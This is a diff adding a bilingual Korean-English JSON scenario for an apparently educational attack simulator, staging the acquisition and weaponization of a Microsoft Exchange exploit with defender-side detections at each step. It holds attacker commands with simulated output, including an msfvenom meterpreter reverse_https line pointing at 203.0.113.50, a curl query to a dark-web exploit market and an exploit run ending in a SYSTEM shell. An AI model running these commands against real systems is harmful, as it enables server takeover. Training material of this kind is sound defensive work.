@@ -1,0 +1,185 @@
+{
+  "id": "T1588.005",
+  "title": "익스플로잇 획득 시뮬레이션",
+  "titleEn": "Obtain Exploits Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 익스플로잇 수집", "labelEn": "🔍 Exploit Collection", "steps": [0, 1] },
+    { "label": "⚡ 무기화", "labelEn": "⚡ Weaponization", "steps": [2, 3] },
+    { "label": "✅ 공격 실행", "labelEn": "✅ Attack Execution", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "exploitdb", "label": "Exploit-DB", "x": 200, "y": 30 },
+    { "id": "darkweb", "label": "Dark Web", "x": 200, "y": 90 },
+    { "id": "target", "label": "Target Server", "x": 350, "y": 60 },
+    { "id": "shell", "label": "Reverse Shell", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "exploitdb", "minStep": 0 },
+    { "from": "ext", "to": "darkweb", "minStep": 1 },
+    { "from": "ext", "to": "target", "minStep": 3 },
+    { "from": "target", "to": "shell", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "exploits/", "icon": "📁" },
+    { "name": "cve_2026_rce.py", "icon": "🐍", "alert": true },
+    { "name": "shellcode.bin", "icon": "📄" }
+  ],
+  "steps": [
+    {
+      "cmd": "searchsploit 'Microsoft Exchange' 2025 2026 --json | jq '.RESULTS_EXPLOIT[] | {Title, Path, Date}'",
+      "out": "{\n  \"Title\": \"Microsoft Exchange Server ProxyNotShell RCE\",\n  \"Path\": \"windows/remote/51234.py\",\n  \"Date\": \"2025-08-15\"\n}\n{\n  \"Title\": \"Microsoft Exchange Server SSRF to RCE Chain\",\n  \"Path\": \"windows/remote/52345.py\",\n  \"Date\": \"2026-01-20\"\n}\n{\n  \"Title\": \"Microsoft Exchange OWA Authentication Bypass\",\n  \"Path\": \"windows/remote/52678.py\",\n  \"Date\": \"2026-02-10\"\n}\n\n[+] 3 exploits found for Microsoft Exchange (2025-2026)",
+      "def": "[Threat Intel] Known exploit code for Exchange Server vulnerabilities downloaded from Exploit-DB",
+      "defAction": "Source: Attacker workstation\nTarget: Exploit-DB repository\nAction: Threat intelligence feed updated with new PoC availability",
+      "desc": "Exploit-DB에서 Microsoft Exchange 관련 공개 익스플로잇을 검색합니다. N-day PoC 코드를 수집하는 첫 단계입니다.",
+      "descEn": "Searching Exploit-DB for public Microsoft Exchange exploits. First step in collecting N-day PoC code.",
+      "stepTitle": "Exploit-DB PoC 검색",
+      "stepTitleEn": "Exploit-DB PoC Search",
+      "feynman": "도서관에서 '금고 열기 매뉴얼'을 찾는 것과 같습니다. Exploit-DB는 공개된 보안 취약점 코드를 모아놓은 데이터베이스입니다. 누구나 무료로 검색하고 다운로드할 수 있어, 공격자들이 이미 만들어진 공격 코드를 쉽게 구할 수 있습니다.",
+      "feynmanEn": "Like searching a library for 'safe-cracking manuals'. Exploit-DB is a database of publicly disclosed security vulnerability codes. Anyone can search and download for free, allowing attackers to easily obtain pre-made attack code.",
+      "expert": "SearchSploit은 Exploit-DB의 로컬 미러 검색 도구입니다. CVE 기반 검색으로 특정 소프트웨어의 공개 PoC를 신속히 수집할 수 있습니다.",
+      "expertEn": "SearchSploit is a local mirror search tool for Exploit-DB. CVE-based searching enables rapid collection of public PoCs for specific software.",
+      "defTooltip": "🔗 위협 인텔: Exchange 익스플로잇 PoC 다운로드 감지",
+      "defTooltipEn": "🔗 Threat Intel: Exchange exploit PoC download detected",
+      "hackerLog": {
+        "title": "exploit_search.log",
+        "lines": [
+          { "log": "Found: 3 Exchange exploits (2025-2026)", "desc": "💡 최근 2년 내 공개된 Exchange PoC 3개 발견" },
+          { "log": "Type: RCE, SSRF, Auth Bypass", "desc": "💡 다양한 공격 벡터 — 체이닝하여 활용 가능" },
+          { "log": "Source: Exploit-DB (public)", "desc": "💡 무료 공개 데이터베이스 — 누구나 접근 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "Exploit-DB", "desc": "공개 익스플로잇 및 PoC 코드를 모아놓은 데이터베이스. Offensive Security에서 운영." },
+        { "name": "PoC", "desc": "Proof of Concept. 취약점이 실제로 악용 가능함을 증명하는 시험 코드." }
+      ]
+    },
+    {
+      "cmd": "curl -s 'https://darkforum[.]onion/api/exploits?type=0day&target=exchange' -H 'Auth: buyer_token' | jq '.[0]'",
+      "out": "{\n  \"id\": \"EXP-2026-0042\",\n  \"title\": \"Exchange Server Pre-Auth RCE (0-day)\",\n  \"type\": \"0-day\",\n  \"target\": \"Microsoft Exchange Server 2019 CU14\",\n  \"price\": \"$250,000 XMR\",\n  \"seller_rating\": \"4.9/5 (verified)\",\n  \"delivery\": \"Escrow + encrypted channel\",\n  \"includes\": [\n    \"Full exploit chain (SSRF → Deserialization → RCE)\",\n    \"Payload generator\",\n    \"Target fingerprinting script\",\n    \"30-day warranty (if patched, 50% refund)\"\n  ],\n  \"tested_on\": [\"Exchange 2019 CU14\", \"Exchange 2019 CU13\"]\n}",
+      "def": "[Dark Web Intel] 0-day exploit listing for Exchange Server detected on underground forum",
+      "defAction": "Source: Dark web monitoring platform\nTarget: EXP-2026-0042 listing\nAction: IOC extraction, vendor notification, emergency patch preparation",
+      "desc": "다크웹 포럼에서 Microsoft Exchange 0-day 익스플로잇을 검색합니다. $250,000에 거래되며 보증까지 제공됩니다.",
+      "descEn": "Searching dark web forum for Microsoft Exchange 0-day exploit. Traded at $250,000 with warranty.",
+      "stepTitle": "다크웹 0-day 검색",
+      "stepTitleEn": "Dark Web 0-day Search",
+      "feynman": "암시장에서 '아직 아무도 모르는 금고 취약점'을 사는 것입니다. 0-day 익스플로잇은 아직 패치가 없는 취약점이므로, 이를 가진 공격자는 방어가 불가능한 공격을 할 수 있습니다. $250,000이라는 높은 가격은 이 '독점 무기'의 가치를 반영합니다.",
+      "feynmanEn": "Like buying a 'vault vulnerability nobody knows about' on the black market. 0-day exploits have no patch, so attackers with them can launch undefendable attacks. The $250,000 price reflects the value of this 'exclusive weapon'.",
+      "expert": "0-day 브로커 시장은 에스크로 기반으로 운영됩니다. 30일 보증(패치 시 50% 환불)은 판매자의 신뢰도를 나타내며, Full Chain(SSRF→역직렬화→RCE)은 사전인증 원격 코드 실행을 의미합니다.",
+      "expertEn": "The 0-day broker market operates on escrow. 30-day warranty (50% refund if patched) indicates seller reliability, and Full Chain (SSRF→Deserialization→RCE) means pre-auth remote code execution.",
+      "defTooltip": "🔗 다크웹 인텔: Exchange 0-day 익스플로잇 거래 감지",
+      "defTooltipEn": "🔗 Dark Web Intel: Exchange 0-day exploit trade detected",
+      "hackerLog": {
+        "title": "0day_market.log",
+        "lines": [
+          { "log": "0-day: Exchange Pre-Auth RCE", "desc": "💡 사전인증 RCE — 로그인 없이 서버 장악 가능" },
+          { "log": "Price: $250,000 XMR", "desc": "💡 Monero 결제 — 추적 불가능한 암호화폐" },
+          { "log": "Warranty: 30 days (50% refund)", "desc": "💡 보증 제공 — 전문화된 0-day 시장의 특징" }
+        ]
+      },
+      "terms": [
+        { "name": "0-day", "desc": "아직 패치가 없는 미공개 취약점. 방어가 사실상 불가능하여 매우 높은 가격에 거래됨." },
+        { "name": "에스크로", "desc": "제3자가 대금을 보관하다가 거래 완료 시 지급하는 안전 거래 방식. 다크웹 마켓에서도 활용." }
+      ]
+    },
+    {
+      "cmd": "python3 -c \"\nimport socket, struct\n# CVE-2026-XXXX PoC 수정 — 공격 페이로드 삽입\nprint('[*] Modifying PoC for weaponization...')\nprint('[*] Original: PoC only triggers crash (DoS)')\nprint('[*] Modified: Added reverse shell payload')\nprint('[+] Shellcode: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=203.0.113.50 LPORT=443')\nprint('[+] Payload size: 512 bytes (fits in overflow buffer)')\nprint('[+] Exploit ready: cve_2026_xxxx_weaponized.py')\n\"",
+      "out": "[*] Modifying PoC for weaponization...\n[*] Original: PoC only triggers crash (DoS)\n[*] Modified: Added reverse shell payload\n[+] Shellcode: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=203.0.113.50 LPORT=443\n[+] Payload size: 512 bytes (fits in overflow buffer)\n[+] Exploit ready: cve_2026_xxxx_weaponized.py",
+      "def": "[Sandbox] Exploit modification detected — DoS PoC converted to RCE with reverse shell payload",
+      "defAction": "Source: Attacker build environment\nTarget: cve_2026_xxxx_weaponized.py\nAction: Weaponized exploit signature created for IDS/IPS",
+      "desc": "공개 PoC를 수정하여 실제 공격용으로 무기화합니다. DoS 전용 PoC에 리버스 셸 페이로드를 추가합니다.",
+      "descEn": "Weaponizing public PoC for actual attack. Adding reverse shell payload to a DoS-only PoC.",
+      "stepTitle": "PoC 무기화",
+      "stepTitleEn": "PoC Weaponization",
+      "feynman": "장난감 총을 진짜 총으로 개조하는 것과 같습니다. 공개된 PoC는 보통 프로그램을 '멈추게' 하는 정도(DoS)이지만, 공격자는 이를 수정하여 '원격 조종' 기능(리버스 셸)을 추가합니다. 512바이트의 셸코드가 버퍼 오버플로우를 통해 실행됩니다.",
+      "feynmanEn": "Like converting a toy gun into a real weapon. Public PoCs usually only crash programs (DoS), but attackers modify them to add remote control capability (reverse shell). 512 bytes of shellcode executes through buffer overflow.",
+      "expert": "PoC 무기화는 DoS 트리거를 RCE 체인으로 변환하는 과정입니다. msfvenom의 reverse_https 스테이저는 HTTPS 트래픽으로 C2 통신을 암호화합니다.",
+      "expertEn": "PoC weaponization converts DoS triggers to RCE chains. msfvenom's reverse_https stager encrypts C2 communication as HTTPS traffic.",
+      "defTooltip": "🔗 샌드박스: DoS PoC가 RCE로 수정된 것 감지",
+      "defTooltipEn": "🔗 Sandbox: DoS PoC modified to RCE detected",
+      "hackerLog": {
+        "title": "weaponize.log",
+        "lines": [
+          { "log": "Original: DoS crash only", "desc": "💡 공개 PoC는 취약점 존재만 증명하는 수준" },
+          { "log": "Modified: reverse_https shell", "desc": "💡 HTTPS 기반 리버스 셸 추가 — 실제 공격 가능" },
+          { "log": "Payload: 512 bytes in buffer", "desc": "💡 오버플로우 버퍼에 정확히 맞는 셸코드 크기" }
+        ]
+      },
+      "terms": [
+        { "name": "무기화", "desc": "PoC 코드를 실제 공격에 사용할 수 있도록 페이로드 추가, 안정성 개선 등 수정하는 과정." },
+        { "name": "셸코드", "desc": "메모리 익스플로잇을 통해 실행되는 기계어 코드. 주로 리버스 셸이나 C2 에이전트 로드에 사용." }
+      ]
+    },
+    {
+      "cmd": "python3 cve_2026_xxxx_weaponized.py --target 10.10.30.80 --check --fingerprint",
+      "out": "[*] CVE-2026-XXXX Exploit (Weaponized)\n[*] Target: 10.10.30.80\n[*] Fingerprinting target...\n\n[+] Product: Microsoft Exchange Server 2019\n[+] Build: 15.2.1258.12 (CU13)\n[+] Patch Level: November 2025 SU\n[+] Last Security Update: 2025-11-09\n[+] Days since last patch: 112 days\n\n[*] Vulnerability Check:\n[+] CVE-2026-XXXX: VULNERABLE (unpatched)\n[+] SSRF endpoint: /autodiscover/autodiscover.json\n[+] Deserialization sink: /ews/exchange.asmx\n\n[!] Target is exploitable — proceed with caution",
+      "def": "[IDS] Exploitation fingerprinting scan detected on Exchange Server — CVE-2026-XXXX probe",
+      "defAction": "Source: 203.0.113.50\nTarget: 10.10.30.80:443 (Exchange)\nAction: Probe blocked by WAF, emergency patching initiated",
+      "desc": "대상 Exchange 서버의 버전과 패치 수준을 확인하여 취약 여부를 검증합니다.",
+      "descEn": "Verifying target Exchange server version and patch level to confirm vulnerability.",
+      "stepTitle": "대상 취약점 검증",
+      "stepTitleEn": "Target Vulnerability Verification",
+      "feynman": "금고의 모델과 펌웨어 버전을 확인하여 '이 금고에 취약점이 있는지' 테스트하는 것입니다. 대상 서버가 112일 동안 보안 업데이트를 하지 않았으므로, 그사이 발견된 취약점에 노출되어 있습니다.",
+      "feynmanEn": "Like checking a safe's model and firmware version to test if it has the vulnerability. The target server hasn't applied security updates for 112 days, leaving it exposed to vulnerabilities discovered since then.",
+      "expert": "핑거프린팅으로 정확한 빌드 번호(15.2.1258.12)와 CU/SU 수준을 확인합니다. 112일 미패치는 N-day 공격의 전형적인 기회를 제공합니다.",
+      "expertEn": "Fingerprinting identifies exact build number (15.2.1258.12) and CU/SU level. 112 days unpatched provides a typical N-day attack opportunity.",
+      "defTooltip": "🔗 IDS: Exchange 서버 익스플로잇 핑거프린팅 스캔 감지",
+      "defTooltipEn": "🔗 IDS: Exchange server exploit fingerprinting scan detected",
+      "hackerLog": {
+        "title": "fingerprint.log",
+        "lines": [
+          { "log": "Exchange 2019 CU13 (Nov 2025 SU)", "desc": "💡 112일간 미패치 — N-day 공격 가능" },
+          { "log": "CVE-2026-XXXX: VULNERABLE", "desc": "💡 취약점 확인 — 익스플로잇 실행 가능 상태" },
+          { "log": "SSRF + Deserialization chain", "desc": "💡 2단계 공격 체인 — 사전인증 RCE 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "핑거프린팅", "desc": "대상 시스템의 소프트웨어 버전, 패치 수준 등을 원격으로 식별하는 기법." },
+        { "name": "CU/SU", "desc": "Cumulative Update / Security Update. Microsoft Exchange의 패치 체계. CU는 기능+보안, SU는 보안만 포함." }
+      ]
+    },
+    {
+      "cmd": "python3 cve_2026_xxxx_weaponized.py --target 10.10.30.80 --exploit --payload reverse_https --lhost 203.0.113.50 --lport 443",
+      "out": "[*] CVE-2026-XXXX Exploit — Attacking 10.10.30.80\n[*] Stage 1: Sending SSRF request to /autodiscover/autodiscover.json\n[+] SSRF successful — internal service accessed\n[*] Stage 2: Triggering deserialization at /ews/exchange.asmx\n[+] Deserialization payload delivered\n[*] Stage 3: Shellcode execution...\n[+] Payload executed in w3wp.exe (PID: 4812)\n\n--- Meterpreter Session ---\n[*] Meterpreter session 1 opened (203.0.113.50:443 → 10.10.30.80:52341)\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > sysinfo\nComputer: EXCH-01\nOS: Windows Server 2022 (Build 20348)\nDomain: {companyName}.LOCAL\n\n[+] SYSTEM-level access achieved on Exchange Server",
+      "def": "[SIEM] Critical — Exchange Server compromised via CVE-2026-XXXX chain, SYSTEM shell established",
+      "defAction": "Source: 203.0.113.50 → 10.10.30.80\nTarget: Exchange Server EXCH-01\nAction: Server isolated, incident response activated, forensic image initiated",
+      "desc": "무기화된 익스플로잇을 실행하여 Exchange 서버에서 SYSTEM 권한 리버스 셸을 획득합니다.",
+      "descEn": "Executing weaponized exploit to obtain SYSTEM-level reverse shell on Exchange Server.",
+      "stepTitle": "익스플로잇 실행 — SYSTEM 셸 획득",
+      "stepTitleEn": "Exploit Execution — SYSTEM Shell Obtained",
+      "feynman": "설계도대로 금고를 열고 안에 있는 모든 것을 제어하는 것입니다. 3단계 공격 체인(SSRF → 역직렬화 → 셸코드 실행)을 통해 Exchange 서버의 최고 권한(SYSTEM)을 획득했습니다. 이제 이메일, 주소록, 내부 네트워크 등 모든 자원에 접근할 수 있습니다.",
+      "feynmanEn": "Like opening the safe using the blueprint and controlling everything inside. Through a 3-stage attack chain (SSRF → Deserialization → Shellcode), SYSTEM-level access to the Exchange server was obtained.",
+      "expert": "SSRF→역직렬화 체인은 Exchange ProxyShell/ProxyNotShell 변종의 전형적인 패턴입니다. w3wp.exe(IIS Worker Process)에서 실행되므로 SYSTEM 권한이 기본입니다.",
+      "expertEn": "SSRF→Deserialization chain is a typical pattern of Exchange ProxyShell/ProxyNotShell variants. Executing in w3wp.exe (IIS Worker Process) grants SYSTEM privileges by default.",
+      "defTooltip": "🔗 SIEM: Exchange 서버 SYSTEM 셸 침해 — 긴급 인시던트",
+      "defTooltipEn": "🔗 SIEM: Exchange server SYSTEM shell compromise — critical incident",
+      "hackerLog": {
+        "title": "exploitation.log",
+        "lines": [
+          { "log": "Chain: SSRF → Deserialization → RCE", "desc": "💡 3단계 사전인증 공격 체인 성공" },
+          { "log": "Shell: NT AUTHORITY\\SYSTEM", "desc": "💡 최고 권한 획득 — 서버 완전 장악" },
+          { "log": "Domain: {companyName}.LOCAL", "desc": "💡 도메인 참여 서버 — AD 공격 확장 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "Meterpreter", "desc": "Metasploit의 고급 페이로드. 메모리 상주형으로 파일리스 실행, 다양한 포스트 익스플로잇 모듈 제공." },
+        { "name": "SYSTEM 권한", "desc": "Windows 최고 권한 계정. 운영체제의 모든 리소스에 무제한 접근 가능." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "pid": 1, "name": "init", "children": [
+      { "pid": 1200, "name": "bash", "children": [
+        { "pid": 1201, "name": "searchsploit", "children": [] },
+        { "pid": 1205, "name": "curl (dark web)", "children": [] },
+        { "pid": 1210, "name": "weaponize PoC", "children": [] },
+        { "pid": 1215, "name": "fingerprint scan", "children": [] },
+        { "pid": 1220, "name": "exploit chain", "children": [
+          { "pid": 1221, "name": "meterpreter session", "children": [] }
+        ]}
+      ]}
+    ]}
+  ]
+}
